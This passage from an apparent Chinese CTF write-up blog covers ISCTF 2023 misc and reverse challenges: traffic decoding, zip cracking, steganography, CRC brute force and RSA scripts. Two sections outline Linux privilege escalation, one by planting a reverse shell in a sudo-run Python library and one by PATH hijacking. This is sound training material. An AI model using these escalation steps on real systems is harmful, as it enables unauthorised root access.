src="/mdimg/isctf2023/9.png"><br>这里注意蓝牙和usb键盘流量是连着的<br>所以蓝牙流量最后的是大写然后usb接着又按了大写键，则后面的都为小写</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">AGGSZ&#123;Kp_wn_YRV_sov_jmfyffjs!!!&#125;<br>ISCTF&#123;So_ez_USB_and_vigenere!!!&#125; <br></code></pre></td></tr></table></figure><h3 id="杰伦可是流量明星"><a href="#杰伦可是流量明星" class="headerlink" title="杰伦可是流量明星"></a><strong>杰伦可是流量明星</strong></h3><p>binwalk分离出流量包<br>追踪http流<br><img src="/mdimg/isctf2023/10.png"><br>ISCTF{wddhr836459_83}</p><h3 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a><strong>小蓝鲨的秘密</strong></h3><p>zip伪加密<br>修复宽高<br>得到key 15CTF2023<br><img src="/mdimg/isctf2023/11.png"></p><h3 id="easy-zip"><a href="#easy-zip" class="headerlink" title="easy_zip"></a><strong>easy_zip</strong></h3><p>爆破纯数字</p><h3 id="蓝鲨的福利"><a href="#蓝鲨的福利" class="headerlink" title="蓝鲨的福利"></a><strong>蓝鲨的福利</strong></h3><p>补png文件头<br><img src="/mdimg/isctf2023/12.png"></p><h3 id="EZcrc"><a href="#EZcrc" class="headerlink" title="EZcrc"></a><strong>EZcrc</strong></h3><p>渊龙Sec的CRC32-Tools脚本跑出来读取zip的crc<br>读出来的不是按顺序的<br>要手动排序一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><br>crc_list = [<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0x67ff2f5b</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8011b198</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xca923eba</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0x44454e88</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0x35a296cb</span>,<span class="hljs-number">0x67ff2f5b</span>,<span class="hljs-number">0x55de84d6</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x3d31ef42</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xef809c83</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf1a75063</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x987a20e2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xca923eba</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x3d31ef42</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf1a75063</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x987a20e2</span>,<span class="hljs-number">0x35a296cb</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xffcef5e5</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0x961e78b1</span>,<span class="hljs-number">0x7b28dc77</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xacb845e7</span>,<span class="hljs-number">0x987a20e2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xffcef5e5</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0x55de84d6</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0x44454e88</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0x44454e88</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf1a75063</span>,<span class="hljs-number">0x8ad3bf47</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf9cd093c</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xe71302b2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xca923eba</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x3d31ef42</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0x35a296cb</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xe71302b2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8011b198</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0x67ff2f5b</span>,<span class="hljs-number">0x3556ac70</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0xffcef5e5</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xef809c83</span>]<br><span class="hljs-keyword">for</span> target_crc <span class="hljs-keyword">in</span> crc_list:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>                data = <span class="hljs-built_in">bytes</span>([i, j, k])  <span class="hljs-comment"># 构造3字节数据</span><br>                crc = zlib.crc32(data) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># 计算CRC32值</span><br>                <span class="hljs-keyword">if</span> crc == target_crc:<br>                    data=data.decode()<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found matching data: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Finished searching.&quot;</span>)<br></code></pre></td></tr></table></figure><p>对表手搓<br>base64decode2次<br><img src="/mdimg/isctf2023/13.png"></p><h3 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a><strong>Ez_misc</strong></h3><p>key在最后一页<br>M13c_!ps2s23<br>加文件头FFD8FFE0<br><img src="/mdimg/isctf2023/14.png"></p><h3 id="spalshes"><a href="#spalshes" class="headerlink" title="spalshes"></a><strong>spalshes</strong></h3><p>做题习惯，zip先挂着爆破<br><img src="/mdimg/isctf2023/15.png"><br>设置纯数字密钥我是没想到的，但凡加几个字符都爆破不出来…感觉一堆非预期<br>直接做吧<br>base64解码后为点数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 提供的数据</span><br>data = [<br>    <span class="hljs-number">1</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">4</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">11.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span><br>]<br><br><span class="hljs-comment"># 将数据分割成 x 和 y 坐标</span><br>x = data[::<span class="hljs-number">3</span>]<br>y = data[<span class="hljs-number">1</span>::<span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 绘制散点图</span><br>plt.scatter(x, y)<br>plt.title(<span class="hljs-string">&#x27;Scatter Plot&#x27;</span>)<br>plt.xlabel(<span class="hljs-string">&#x27;X-axis&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Y-axis&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/isctf2023/16.png"><br><img src="/mdimg/isctf2023/17.png"></p><h3 id="镜流"><a href="#镜流" class="headerlink" title="镜流"></a><strong>镜流</strong></h3><p>爆破 306256<br>hint 把图片缩小10倍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./1new.png&#x27;</span>)<br>w = img.width<br>h = img.height<br>img_obj = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(w//<span class="hljs-number">10</span>,h//<span class="hljs-number">10</span>))<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h//<span class="hljs-number">10</span>):<br>        (r,g,b)=img.getpixel((x*<span class="hljs-number">10</span>,y*<span class="hljs-number">10</span>))<br>        img_obj.putpixel((x,y),(r,g,b))<br><br>img_obj.save(<span class="hljs-string">&#x27;./1.png&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>zsteg -e b1,rgb,lsb,xy ./1.png &gt; flag.png<br><img src="/mdimg/isctf2023/18.png"><br>ISCTF{JINGLIU_IS_SO_COOL}</p><h3 id="张万森-下雪了"><a href="#张万森-下雪了" class="headerlink" title="张万森,下雪了"></a>张万森,下雪了</h3><p>用给的字典爆破 blueSHARK666<br>tip.txt 解很多层base64<br>词频分析 得到key ISCTFZ023<br>snow隐写<br><img src="/mdimg/isctf2023/19.png"><br>ISCTF{34da-a87s-sk87-s384-3982-398233}</p><h3 id="MCSOG-猫猫"><a href="#MCSOG-猫猫" class="headerlink" title="MCSOG-猫猫"></a><strong>MCSOG-猫猫</strong></h3><p>linux vim 打开可以看见只有 200c 200e 202c<br><img src="/mdimg/isctf2023/20.png"></p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a><strong>stream</strong></h3><p>盲注<br>成功的返回包总长度是1072<br>手搓<br><img src="/mdimg/isctf2023/21.png"></p><h3 id="PNG的基本食用"><a href="#PNG的基本食用" class="headerlink" title="PNG的基本食用"></a><strong>PNG的基本食用</strong></h3><p>1 修改宽高<br>2 lsb<br><img src="/mdimg/isctf2023/22.png"><br>3 提取尾部7z<br>拼接 ISCTF{png-is-so-ez-for-you}</p><h3 id="sudopy"><a href="#sudopy" class="headerlink" title="sudopy"></a><strong>sudopy</strong></h3><p><img src="/mdimg/isctf2023/23.png"><br>导入了一个python库<br>python提权<br><img src="/mdimg/isctf2023/24.png"><br>vim /usr/lib/python3.10/webbrowser.py<br>加入本地弹shell的语句<br><img src="/mdimg/isctf2023/25.png"><br>sudo /usr/bin/python3 /home/ctf/web.py<br><img src="/mdimg/isctf2023/26.png"><br>其实也可以直接重写 web.py 或者直接在里面加弹shell语句</p><h3 id="status"><a href="#status" class="headerlink" title="status"></a><strong>status</strong></h3><p><img src="/mdimg/isctf2023/27.png"><br>checkgenshin 有执行权限<br>丢ida<br><img src="/mdimg/isctf2023/28.png"><br>可以看到这个脚本前面设置root权限然后执行一个system命令<br>linux的命令是在环境变量里寻找并通过脚本文件执行的<br>也就是说<br>可以通过劫持环境变量，让这个checkgenshin 执行时在环境变量中先找到我们自己写的shell脚本，然后执行<br><img src="/mdimg/isctf2023/29.png"><br>checkgenshin执行 service ssh status 时会执行 我们写的 service</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h1><h3 id="babyRe"><a href="#babyRe" class="headerlink" title="babyRe"></a><strong>babyRe</strong></h3><p>简单数学</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>a =  <span class="hljs-number">292884018782106151080211087047278002613718113661882871562870811030932129300110050822187903340426820507419488984883216665816506575312384940488196435920320779296487709207011656728480651848786849994095965852212548311864730225380390740637527033103610408592664948012814290769567441038868614508362013860087396409860</span><br>b= <span class="hljs-number">21292789073160227295768319780997976991300923684414991432030077313041762314144710093780468352616448047534339208324518089727210764843655182515955359309813600286949887218916518346391288151954579692912105787780604137276300957046899460796651855983154616583709095921532639371311099659697834887064510351319531902433355833604752638757132129136704458119767279776712516825379722837005380965686817229771252693736534397063201880826010273930761767650438638395019411119979149337260776965247144705915951674697425506236801595477159432369862377378306461809669885764689526096087635635247658396780671976617716801660025870405374520076160</span><br>c= <span class="hljs-number">5203005542361323780340103662023144468501161788183930759975924790394097999367062944602228590598053194005601497154183700604614648980958953643596732510635460233363517206803267054976506058495592964781868943617992245808463957957161100800155936109928340808755112091651619258385206684038063600864669934451439637410568700470057362554045334836098013308228518175901113235436257998397401389511926288739759268080251377782356779624616546966237213737535252748926042086203600860251557074440685879354169866206490962331203234019516485700964227924668452181975961352914304357731769081382406940750260817547299552705287482926593175925396</span><br><br>n = b -a -<span class="hljs-number">1</span><br>e =<span class="hljs-number">65537</span><br>phi = n -a + <span class="hljs-number">1</span><br>d= gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#ISCTF&#123;kisl-iopa-qdnc-tbfs-ualv&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023 wp</title>
    <link href="/2023/10/16/moectf2023/"/>
    <url>/2023/10/16/moectf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h3 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h3><p><img src="/mdimg/moectf2023/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 